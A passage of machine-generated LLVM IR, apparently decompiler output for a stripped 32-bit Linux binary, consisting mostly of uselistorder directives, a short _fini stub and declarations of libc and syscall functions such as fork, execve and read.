275, 853, 854, 356, 273, 855, 276, 856, 857, 858, 849, 539, 538, 537, 536, 107, 109, 108, 104, 106, 105, 110, 859, 540, 148, 145, 147, 146, 277, 541, 860, 861, 543, 542, 98, 99, 862, 863, 248, 247, 239, 864, 305, 865, 866, 246, 867, 278, 868, 332, 869, 545, 544, 100, 102, 101, 103, 279, 333, 4, 334, 546, 547, 81, 80, 879, 549, 548, 207, 208, 306, 884, 550, 206, 335, 209, 336, 755, 756, 757, 758, 759, 760, 761, 762, 252, 763, 554, 553, 552, 551, 87, 88, 557, 556, 555, 558, 337, 736, 737, 338, 339, 738, 560, 559, 562, 561, 86, 563, 35, 564, 82, 566, 565, 159, 567, 143, 568, 134, 569, 202, 570, 572, 571, 203, 573, 144, 644, 237, 645, 238, 646, 647, 281, 648, 649, 650, 307, 280, 651, 282, 652, 653, 654, 215, 223, 224, 235, 340, 655, 617, 583, 582, 373, 581, 580, 579, 578, 577, 576, 575, 574, 367, 151, 150, 152, 153, 656, 657, 658, 659, 660, 584, 590, 589, 588, 587, 586, 585, 204, 205, 591, 663, 225, 664, 665, 666, 667, 668, 669, 670, 671, 672, 368, 369, 216, 673, 236, 226, 674, 675, 676, 677, 217, 678, 679, 680, 681, 682, 683, 684, 685, 592, 686, 593, 357, 594, 596, 595, 687, 597, 692, 358, 618, 599, 598, 283, 693, 619, 341, 359, 605, 604, 603, 602, 601, 600, 694, 695, 696, 607, 606, 370, 311, 697, 5, 698, 608, 344, 870, 871, 345, 872, 873, 346, 347, 874, 875, 609, 889, 610, 612, 611, 613 }
  uselistorder label %dec_label_pc_8050946, { 1, 0 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v0_805095b = load i32, i32* @ebx, align 4
  %v1_805095c = call i32 @__get_pc_thunk_bx(i32 %v0_805095b)
  store i32 %v1_805095c, i32* @eax, align 4
  %v0_8050967 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_8050967

; uselistorder directives
  uselistorder i32* @eax, { 14, 2, 62, 99, 4, 100, 101, 3, 102, 0, 61, 1, 98, 103, 63, 104, 67, 68, 70, 15, 69, 105, 107, 106, 6, 7, 156, 157, 167, 168, 108, 45, 113, 46, 114, 115, 116, 47, 117, 5, 49, 50, 133, 134, 51, 135, 52, 136, 137, 53, 54, 55, 138, 139, 140, 141, 56, 142, 143, 144, 145, 57, 126, 170, 171, 64, 172, 173, 175, 65, 176, 8, 174, 11, 13, 169, 74, 16, 71, 72, 94, 73, 151, 153, 154, 152, 75, 76, 146, 147, 149, 150, 148, 155, 58, 9, 122, 123, 124, 60, 125, 118, 119, 120, 121, 77, 78, 127, 128, 79, 80, 158, 160, 159, 161, 162, 164, 66, 163, 129, 130, 48, 131, 132, 109, 40, 41, 110, 42, 111, 43, 44, 112, 17, 81, 82, 83, 84, 85, 18, 86, 87, 19, 88, 20, 22, 21, 23, 89, 24, 90, 91, 92, 25, 26, 93, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 95, 38, 96, 39, 97, 59, 177, 165, 166, 10, 12 }
  uselistorder i32 (i32)* @__get_pc_thunk_bx, { 1, 0 }
  uselistorder i32 0, { 1040, 12, 13, 14, 54, 848, 1041, 1044, 1042, 1043, 849, 46, 1045, 1200, 1201, 17, 56, 1048, 1056, 1050, 1051, 18, 43, 1052, 1053, 1054, 850, 1055, 55, 104, 105, 106, 1046, 1047, 114, 1057, 1058, 1060, 1061, 1059, 1062, 218, 1063, 1064, 1065, 1066, 1067, 1068, 115, 116, 851, 256, 257, 89, 936, 852, 937, 938, 59, 60, 939, 940, 941, 846, 942, 58, 853, 57, 854, 117, 0, 1, 855, 118, 119, 856, 857, 858, 120, 859, 1071, 860, 1069, 205, 1070, 258, 259, 121, 2, 3, 861, 1072, 1073, 1074, 1075, 1076, 260, 862, 863, 122, 1077, 19, 61, 953, 90, 91, 864, 1078, 62, 865, 20, 123, 1202, 261, 1079, 1080, 1081, 1203, 1204, 11, 219, 125, 124, 1205, 1206, 220, 1207, 1208, 126, 127, 866, 1082, 128, 1083, 867, 1209, 868, 1210, 1211, 1212, 1213, 1084, 1337, 129, 869, 4, 943, 5, 1338, 1339, 1340, 1341, 1342, 1344, 1343, 130, 262, 1087, 1088, 1089, 1090, 98, 21, 1091, 63, 1104, 1105, 1118, 1119, 1120, 1121, 1127, 1128, 1129, 1130, 1122, 1123, 1124, 1125, 1126, 64, 65, 870, 1131, 1132, 66, 67, 68, 871, 1133, 1134, 1135, 1136, 1137, 1138, 1139, 1140, 1142, 1143, 1144, 1145, 1146, 1147, 1148, 1150, 1151, 1152, 131, 1164, 1165, 132, 1166, 1167, 1168, 69, 99, 221, 107, 872, 100, 1214, 133, 1215, 22, 101, 92, 1216, 193, 134, 1217, 93, 1218, 1092, 1093, 1100, 222, 1101, 873, 1219, 263, 1220, 1221, 1222, 1223, 1224, 1225, 1226, 1227, 135, 874, 1228, 1229, 1230, 1231, 136, 1232, 875, 137, 190, 264, 138, 876, 877, 878, 223, 1233, 1234, 1235, 1236, 224, 211, 212, 1237, 1238, 1239, 1240, 1241, 1242, 879, 225, 1243, 139, 880, 1244, 140, 226, 227, 1245, 1246, 881, 1247, 1248, 1249, 1250, 85, 1347, 1348, 1349, 1350, 94, 194, 102, 1251, 195, 882, 883, 884, 1252, 141, 1253, 1352, 1353, 1169, 1170, 1171, 265, 1172, 1354, 108, 228, 1355, 1173, 954, 1356, 944, 1357, 1358, 1359, 945, 1360, 946, 1361, 1362, 1363, 1141, 1364, 142, 1365, 1374, 1375, 23, 113, 885, 24, 886, 887, 1381, 1385, 196, 1386, 143, 834, 266, 267, 1380, 6, 1366, 1367, 1368, 144, 934, 845, 145, 888, 1387, 7, 229, 230, 146, 1388, 1389, 147, 148, 1391, 1390, 1392, 1393, 268, 835, 1394, 1396, 1395, 1397, 1398, 1399, 149, 889, 1373, 1021, 1022, 1023, 1024, 890, 891, 1025, 253, 892, 231, 150, 151, 152, 269, 270, 95, 271, 1401, 1400, 272, 1402, 153, 154, 893, 947, 894, 948, 155, 895, 156, 896, 955, 70, 956, 957, 958, 8, 897, 1036, 273, 949, 950, 951, 952, 898, 157, 1376, 836, 158, 232, 1377, 1379, 1378, 1182, 1183, 1176, 1177, 1178, 233, 1179, 1180, 1181, 274, 1174, 275, 1175, 276, 899, 959, 109, 960, 234, 900, 961, 901, 902, 277, 837, 903, 278, 838, 159, 904, 1153, 1154, 160, 161, 279, 839, 111, 1155, 1156, 1157, 162, 163, 280, 840, 110, 1158, 197, 1159, 96, 1160, 1161, 1163, 905, 1162, 1184, 906, 235, 1185, 907, 1186, 1187, 1188, 1190, 1191, 1192, 1193, 1194, 1195, 1196, 1197, 1198, 236, 1382, 1384, 1049, 164, 165, 1254, 1255, 112, 1256, 166, 908, 1257, 198, 1258, 71, 1189, 9, 909, 237, 238, 167, 1259, 1260, 1261, 168, 1102, 72, 910, 1094, 911, 1099, 1098, 199, 912, 913, 1095, 1097, 1096, 200, 914, 962, 1103, 963, 1262, 1263, 1264, 1265, 1266, 1267, 1268, 1269, 1270, 169, 915, 1271, 239, 1272, 1273, 1274, 1275, 1276, 25, 26, 916, 213, 214, 1277, 1278, 1279, 1280, 27, 1281, 1282, 1283, 28, 917, 1284, 29, 30, 170, 918, 1285, 1286, 1287, 1290, 1288, 1289, 31, 47, 73, 1291, 1292, 1293, 1294, 254, 1295, 1296, 171, 1297, 172, 1298, 919, 201, 1299, 173, 1300, 920, 1301, 1302, 1304, 1305, 1306, 1307, 1308, 1309, 174, 921, 922, 175, 1310, 1311, 923, 1312, 1313, 1314, 1315, 1316, 924, 1317, 1318, 240, 925, 241, 1319, 1320, 1321, 1322, 1323, 1324, 32, 74, 75, 76, 926, 1325, 176, 927, 1326, 841, 1327, 1328, 177, 928, 97, 44, 86, 1303, 202, 1369, 1370, 203, 1372, 1371, 77, 281, 929, 1106, 1107, 1108, 1109, 1110, 1111, 1112, 1113, 1114, 1115, 242, 1116, 930, 931, 1117, 243, 1329, 178, 1085, 932, 1086, 1351, 179, 1026, 1031, 1345, 1383, 964, 1346, 965, 180, 966, 967, 968, 969, 970, 971, 972, 973, 974, 1038, 1149, 191, 975, 976, 33, 977, 34, 35, 78, 244, 207, 245, 36, 192, 978, 979, 37, 79, 38, 48, 980, 981, 39, 49, 250, 982, 983, 251, 984, 985, 246, 282, 986, 987, 988, 990, 206, 989, 247, 847, 991, 992, 993, 1002, 994, 995, 996, 997, 998, 999, 1000, 1001, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 103, 1010, 88, 83, 82, 1011, 1012, 87, 81, 80, 1013, 210, 208, 209, 40, 50, 1014, 285, 248, 1015, 284, 283, 286, 1016, 287, 215, 181, 1017, 842, 1018, 45, 1020, 41, 51, 1019, 216, 217, 289, 182, 288, 843, 844, 1027, 183, 1028, 1029, 1030, 184, 290, 291, 185, 1032, 292, 1033, 186, 187, 252, 293, 1034, 1035, 188, 249, 15, 52, 16, 53, 1037, 42, 1039, 294, 1199, 1330, 1331, 255, 1332, 1333, 84, 933, 10, 1334, 1335, 1336, 189, 935, 204, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 1403, 1404, 1405, 1406, 1407, 1408, 1409, 1410 }
  uselistorder i32* @ebx, { 39, 151, 152, 355, 356, 153, 155, 158, 159, 160, 161, 162, 156, 154, 157, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 183, 184, 0, 185, 186, 187, 188, 189, 190, 191, 192, 193, 67, 68, 357, 358, 359, 194, 3, 195, 196, 197, 4, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 360, 361, 362, 363, 209, 210, 211, 212, 465, 466, 467, 468, 469, 6, 220, 218, 219, 221, 224, 222, 223, 225, 226, 227, 5, 256, 228, 1, 271, 272, 273, 274, 275, 276, 7, 277, 278, 279, 280, 281, 282, 283, 284, 287, 288, 289, 290, 291, 294, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 229, 230, 231, 232, 8, 241, 9, 242, 243, 364, 365, 366, 367, 10, 368, 369, 370, 11, 371, 12, 372, 373, 374, 375, 13, 376, 377, 378, 379, 380, 381, 382, 475, 476, 14, 477, 478, 481, 482, 383, 384, 483, 484, 485, 486, 487, 324, 15, 325, 326, 488, 489, 490, 327, 328, 79, 80, 81, 491, 52, 492, 493, 494, 495, 496, 497, 53, 498, 499, 500, 501, 502, 285, 286, 295, 296, 297, 503, 504, 505, 33, 34, 514, 515, 516, 523, 524, 525, 526, 30, 16, 28, 517, 520, 521, 522, 506, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 513, 132, 133, 556, 557, 558, 559, 560, 561, 562, 563, 54, 55, 56, 57, 58, 59, 82, 83, 17, 2, 84, 138, 139, 61, 85, 86, 87, 60, 62, 140, 141, 142, 518, 519, 63, 64, 65, 66, 329, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 332, 333, 18, 334, 335, 330, 331, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 19, 99, 100, 101, 102, 103, 104, 105, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 31, 309, 310, 311, 312, 313, 20, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 346, 347, 348, 349, 350, 351, 21, 352, 353, 354, 527, 528, 529, 530, 531, 532, 533, 537, 538, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 244, 245, 246, 247, 248, 249, 250, 251, 233, 236, 237, 238, 239, 240, 234, 235, 106, 107, 108, 109, 252, 253, 254, 255, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 431, 432, 22, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 23, 446, 447, 448, 449, 450, 35, 36, 37, 38, 426, 428, 427, 429, 430, 507, 24, 508, 509, 510, 511, 32, 25, 29, 512, 539, 540, 541, 542, 543, 257, 258, 259, 260, 261, 262, 26, 263, 27, 264, 265, 266, 267, 268, 269, 270, 451, 452, 453, 454, 455, 456, 213, 214, 215, 216, 217, 479, 480, 134, 135, 136, 137, 470, 471, 472, 534, 535, 536, 110, 111, 473, 474, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 149, 150, 292, 293, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 143, 144, 145, 146, 147, 148, 457, 458, 459, 460, 461, 462, 463, 464 }
}

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: nounwind readnone
declare i32 @llvm.ctlz.i32(i32, i1) #1

declare i32 @_strlen(i8*) local_unnamed_addr

declare i8* @_memset(i8*, i32, i32) local_unnamed_addr

declare i8* @_memcpy(i8*, i8*, i32) local_unnamed_addr

declare i32 @_strncmp(i8*, i8*, i32) local_unnamed_addr

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare i32 @unknown_0(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @fork(i32) local_unnamed_addr

declare i32 @getpid(i32) local_unnamed_addr

declare i32 @int80_syscall(i32) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @vfork() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @clock_getres(i32, %timespec*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8 @__decompiler_undefined_function_3() local_unnamed_addr

declare i16* @__decompiler_undefined_function_4() local_unnamed_addr

declare i64 @__decompiler_undefined_function_5() local_unnamed_addr

declare %sigaction* @__decompiler_undefined_function_6() local_unnamed_addr

declare %timespec* @__decompiler_undefined_function_7() local_unnamed_addr

declare %_TYPEDEF_sigset_t* @__decompiler_undefined_function_8() local_unnamed_addr

declare x86_fp80 @__decompiler_undefined_function_9() local_unnamed_addr

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
